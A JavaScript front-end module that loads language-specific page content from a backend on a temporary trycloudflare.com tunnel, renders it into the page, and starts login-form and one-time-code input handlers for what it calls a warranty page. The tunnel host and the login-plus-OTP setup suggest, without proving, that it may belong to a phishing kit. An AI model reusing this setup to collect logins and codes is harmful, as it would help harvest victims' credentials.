/**
 * Load Page Module
 * Main initialization file that coordinates all modules
 * Handles page rendering, language switching, and form/FAQ initialization
 */

const BACKEND_URL = "https://usr-mine-shuttle-shareholders.trycloudflare.com"

import { getAvailableLangs, chooseLangFromNavigator, initLangToggle } from './lang-toggle.js';
import { initFaq } from './faq.js';
import { initFormHandler } from './form-handler.js';
import { showLoading, hideLoading } from './loading-overlay.js';
import { initOptHandler } from './otp-input-handler.js'
import { configureBackend, backendFetch, processDataApiEndpoints, processStaticApiEndopints } from './api-endpoint-helper.js';

const deepCheckKey = (obj, targetKey) => {
  if (!obj || typeof obj !== 'object') return false;
  if (targetKey in obj) return true;

  return Object.values(obj).some(value => deepCheckKey(value, targetKey));
};


async function loadPage(lang = 'en-us') {
    try {
        const response = await backendFetch(`content/${lang}`, { skipLanguageHeader: true });
        const data = processStaticApiEndopints(await response.json());

        // Set document title from lang file
        if (data.pageTitle) {
            document.title = data.pageTitle;
        }

        // Render all Mustache templates
        document.querySelectorAll('[id$="-template"]').forEach((template) => {
            const keyword = template.id.replace('-template', '');
            const target = document.getElementById(`${keyword}-target`);
            if (target) {
                target.innerHTML = Mustache.render(template.innerHTML, data);
            }
        });

        document.documentElement.lang = lang;
        localStorage.setItem('pageLang', lang);

        const langToggle = document.getElementById('lang-toggle');
        if (langToggle) {
            langToggle.value = lang;
        }

        processDataApiEndpoints();

        // Initialize FAQ if on a page with FAQ section
        if (data['faq-section']) {
            initFaq(data['faq-section']);
        }

        // Initialize form handler if on warranty page
        if (data['login-section']) {
            initFormHandler(data);
        }

        // Initialize opt handler if on warranty page
        if (document.querySelector('.otp-inputs')) {
            initOptHandler(data)
        }

    } catch (error) {
        console.error('Failed to load page:', error);
    }
}

async function initializeApp() {
    try {
        configureBackend(BACKEND_URL);
        showLoading();

        const available = await getAvailableLangs();

        const savedLang = localStorage.getItem('pageLang') || chooseLangFromNavigator(navigator.languages, available);

        // Initialize language toggle listener
        initLangToggle(loadPage);

        // Load initial page
        await loadPage(savedLang);

    } catch (error) {
        alert("Something went wrong. Please try again later.")
    } finally {
        hideLoading();
    }

}

// Initialize app when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeApp);
} else {
    initializeApp();
}
